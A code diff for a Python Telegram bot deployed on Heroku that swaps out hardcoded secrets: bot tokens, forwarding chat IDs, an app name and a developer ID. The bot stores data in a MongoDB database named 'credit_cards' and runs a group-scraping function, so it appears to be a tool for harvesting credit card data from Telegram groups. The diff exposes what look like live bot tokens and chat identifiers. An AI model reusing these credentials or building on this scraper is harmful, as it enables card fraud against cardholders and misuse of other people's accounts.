@@ -20,10 +20,10 @@ now it is an obsolete version for my work environment, that's why I post it for 
 ---------------Deploy on Heroku
 
 -Secret keys: 
-	-TOKEN: 5425696821:AAGjNDpbgqS6MfrONfyYF0ErApScMLSJ3AY
+	-TOKEN: 5465734618:AAH_Ua_oRYEM3sCpnKRZny4OYxq5HDNQT9Y
 	- MODE: prod
-	- CHAT_ID_FORWARD: -1001783823529
-	- HEROKU_APP_NAME: (mdzcheckerbot)
+	- CHAT_ID_FORWARD: -1001575229583
+	- HEROKU_APP_NAME: (akbcbotk)
 '''
 
 
@@ -37,7 +37,7 @@ client = pymongo.MongoClient(
 	)# MONGO DB LINK 
 db = client.credit_cards
 
-developers = ['1740075227']
+developers = ['5195866238']
 
 
 addusr = ""
@@ -66,7 +66,7 @@ def start(update):
 @run_async
 def extrct(update, context):
 	
-	gex = ['-1001541044740'] #Para excluir grupos da raspagem
+	gex = ['-1001575229583'] #Para excluir grupos da raspagem
 
 	try:
 		chat_id = str(update.message.chat_id)
